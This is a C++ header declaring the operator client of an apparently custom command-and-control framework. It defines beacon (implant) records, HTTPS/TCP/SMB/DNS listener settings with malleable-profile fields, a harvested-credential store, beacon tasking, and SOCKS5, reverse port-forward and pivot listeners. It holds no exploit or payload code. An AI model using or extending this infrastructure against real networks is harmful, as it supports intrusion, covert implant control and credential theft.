#pragma once

#include <co2h/bytes.hpp>
#include <co2h/framing.hpp>
#include <co2h/proto.hpp>

#include <QByteArray>
#include <QHash>
#include <QObject>
#include <QString>
#include <QVector>

#include <asio.hpp>
#include <asio/ssl.hpp>

#include <atomic>
#include <memory>
#include <mutex>
#include <thread>
#include <unordered_map>
#include <unordered_set>

namespace co2h::client {

struct BeaconRow {
    QString id;
    QString parent_id;
    QString host;
    QString user;
    QString listener;
    QString internal_ip;
    QString external_ip;
    QString arch;             // "x64" или "x86"
    QString os;               // "windows" или "linux"
    std::uint32_t pid        = 0;
    qint64        first_seen = 0; // Unix timestamp (секунды), 0 = неизвестно
    qint64        last_seen  = 0;
};

struct ListenerRow {
    QString name;
    QString kind;
    QString bind;
    QString key_hex;
    QString pubkey_hex;   // RSA-2048 BCRYPT_RSAPUBLIC_BLOB hex (HTTPS/TCP/SMB/DNS)
    QString domain;       // DNS только: authoritative C2 domain suffix
    // HTTPS только: поля malleable-профиля — нужны artifact-gen при сборке beacon'а.
    QString uri_checkin;
    QString uri_task;
    QString uri_post;
    QString cookie;
    QString user_agent;
};

struct OperatorRowSrv {
    quint64 id = 0;
    QString username;
    QString role;
    quint64 created_at = 0;
};

struct CredentialRowSrv {
    quint64    id = 0;
    QString    user;
    QString    domain;
    QString    kind;
    QString    secret;
    QString    host;
    QString    source;
    QString    note;
    QString    added_by;
    quint64    added_at = 0;
};

// Asynchronous Asio+OpenSSL client of the teamserver operator protocol.
// Runs the Asio io_context on a background thread. All Qt signals are
// emitted from that thread — connect using Qt::QueuedConnection.
class ServerClient : public QObject {
    Q_OBJECT
public:
    explicit ServerClient(QObject* parent = nullptr);
    ~ServerClient() override;

    void connectToServer(const QString& host, quint16 port,
                         const QString& username, const QString& password,
                         const QString& ca_file,
                         const QString& client_cert,
                         const QString& client_key);
    void disconnectFromServer();

    void listSessions();
    void listListeners();
    // Возвращает rpc_id запроса — позволяет связать выданный сервером
    // task_id (через сигнал taskCreated) с локальным контекстом операции
    // (например, путём, куда сохранить файл при download).
    // Устанавливает текст команды оператора для следующего taskBeacon.
    // Автоматически сбрасывается после первого вызова taskBeacon.
    void setNextCmdText(const QString& text) { next_cmd_text_ = text; }

    quint64 taskBeacon(const QString& beacon_id,
                       proto::TaskOp op,
                       const QByteArray& payload);
    // Текущее значение счётчика rpc (для внутреннего использования PluginContext).
    quint64 currentRpcCounter() const { return rpc_next_.load(std::memory_order_relaxed); }
    void addSocks5Listener(const QString& name, const QString& beacon_id,
                           const QString& bind_host, quint16 bind_port);
    void addRportfwdListener(const QString& name, const QString& beacon_id,
                             const QString& bind_host, quint16 bind_port,
                             const QString& rhost, quint16 rport);
    void addPivotListener(const QString& name,
                          const QString& bind_host,
                          quint16 socks_port, quint16 pivot_port);
    void addHttpsListener(const QString& name, const QString& bind_host,
                          quint16 bind_port, const QString& profile_path = {});
    void addTcpListener(const QString& name,
                        const QString& bind_host, quint16 bind_port);
    void addSmbListener(const QString& name, const QString& pipe_name);
    void addDnsListener(const QString& name, const QString& bind_host,
                        quint16 bind_port, const QString& c2_domain);
    void removeListener(const QString& name);
    void sendChat(const QString& text);
    void credsList();
    void credsAdd(const CredentialRowSrv& r);
    void credsDel(quint64 id);

    void listOperators();
    void addOperator(const QString& username, const QString& password,
                     const QString& role);
    void delOperator(quint64 id);
    void setOperatorPassword(quint64 id, const QString& password);

signals:
    void connected();
    void disconnected(const QString& reason);
    void authOk(quint64 operator_id, const QString& role);
    void authFailed(const QString& reason);
    void serverHello(const QString& product, const QString& version);

    void sessionsReceived(QVector<co2h::client::BeaconRow> rows);
    void listenersReceived(QVector<co2h::client::ListenerRow> rows);

    void taskOutput(const QString& beacon_id, quint64 task_id,
                    const QByteArray& output, const QString& error);
    // Сервер подтвердил постановку задачи и выдал task_id.
    void taskCreated(quint64 rpc_id, quint64 task_id);
    // Чат-событие, broadcast от teamserver'а всем подписчикам.
    void chatReceived(const QString& from, const QString& text, quint64 ts);
    void credsListReceived(QVector<co2h::client::CredentialRowSrv> rows);
    void credsChanged(); // broadcast event Credentials → клиент должен перезапросить список
    void operatorsReceived(QVector<co2h::client::OperatorRowSrv> rows);
    // Сообщения о результате операций над операторами (add/del).
    void operatorActionResult(quint64 rpc_id, bool ok, const QString& message);

    // Audit-событие: команда оператора на бикон (broadcast от сервера, только admin).
    void auditReceived(const QString& op, const QString& beacon_id,
                       const QString& cmd_text, quint64 ts);
    void logLine(const QString& line);

private:
    using SslStream = asio::ssl::stream<asio::ip::tcp::socket>;

    void ioThread();
    void startHandshake(const std::string& host);
    void doRead();
    void onRead(std::size_t n);
    void processFrame(const proto::Frame& f);
    void send(proto::MsgType type, BytesView payload);

    QString            host_;
    quint16            port_ = 0;
    QString            user_;
    QString            pass_;
    QString            ca_file_;
    QString            client_cert_;
    QString            client_key_;

    std::thread                  thread_;
    std::unique_ptr<asio::io_context> io_;
    std::unique_ptr<asio::ssl::context> tls_;
    std::unique_ptr<SslStream>  stream_;
    FrameDecoder                decoder_;
    std::array<std::uint8_t, 8192> rbuf_{};

    std::atomic<bool>           running_{false};
    std::mutex                  wmu_;
    std::deque<Bytes>           wq_;
    bool                        writing_ = false;

    QHash<quint64, QByteArray>  dl_chunks_;  // task_id → накопленные байты до is_last
    std::atomic<std::uint64_t>  rpc_next_{1};
    // RPC-идентификаторы запросов kTaskBeacon — нужны, чтобы отличить
    // task-RPC от sessions/listeners при разборе ответа.
    std::mutex                  task_rpc_mu_;
    std::unordered_set<std::uint64_t> task_rpc_ids_;
    std::mutex                  rpc_kind_mu_;
    // Тип RPC по rpc_id, чтобы при ответе понять, какой сигнал испустить.
    // Значения: "sessions", "listeners", "creds_list".
    std::unordered_map<std::uint64_t, std::string> rpc_kind_;

    // Текст команды оператора для audit-рассылки на сервере.
    // Устанавливается setNextCmdText(), подхватывается первым taskBeacon().
    QString next_cmd_text_;
};

}

Q_DECLARE_METATYPE(QVector<co2h::client::BeaconRow>)
Q_DECLARE_METATYPE(QVector<co2h::client::ListenerRow>)
Q_DECLARE_METATYPE(QVector<co2h::client::CredentialRowSrv>)
Q_DECLARE_METATYPE(QVector<co2h::client::OperatorRowSrv>)
